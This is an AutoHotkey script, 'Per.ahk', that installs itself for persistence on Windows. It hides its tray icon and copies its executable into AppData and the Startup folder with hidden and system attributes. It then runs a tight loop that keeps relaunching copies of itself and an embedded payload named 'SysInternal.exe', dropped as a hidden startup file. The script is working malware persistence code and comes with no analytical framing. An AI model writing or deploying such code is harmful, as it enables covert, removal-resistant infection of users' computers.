#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%
#Persistent
#SingleInstance Force
#NoTrayIcon

; Per.ahk

currentDir := A_ScriptDir

targetDir := "C:\Users\" . A_Username . "\tmp"
tempDir := "C:\Users\" . A_Username . "\AppData\Local\Tmp"
tmpDir := "C:\Users\" . A_Username . "\AppData\Local\Tmp\Tmp"
startupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
sysStartupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SysInternal.exe"
startupFile := startupDir . "Per.exe"  ; Define the specific file to watch
tmpDirFile := tmpDir . "\Per1.exe" ; Added backslash for correct path

IfNotExist, %tempDir%
{
    FileCreateDir, %tempDir%
}

FileCopy, %currentDir%\Per.exe, %tempDir%\Per.exe, 1

If (currentDir = tempDir)
{
    Loop
    {
        IfNotExist, %startupFile%
        {
            FileCopy, %currentDir%\Per.exe, %startupFile%, 1
            FileSetAttrib, +SH, %startupFile%
        }
        Process, Exist, Per1.exe
        If (ErrorLevel = 0) ; Process not running
        {
            IfNotExist, %tmpDirFile%
            {
                FileCopy, %startupDir%\Per.exe, %tmpDirFile%, 1
            }
            else
            {
                Run, %tmpDirFile%
            }
        }
        Process, Exist, SysInternal.exe
        If (ErrorLevel = 0) ; Process not running
        {
            IfNotExist, %sysStartupDir%
            {
                FileInstall, SysInternal.exe, %sysStartupDir%, 1
                FileSetAttrib, +SH, %sysStartupDir%
            }
            else
            {
                Run, %sysStartupDir%
            }
        }
        Sleep, 5
    }
}
else
{
    Run, %tempDir%\Per.exe
}
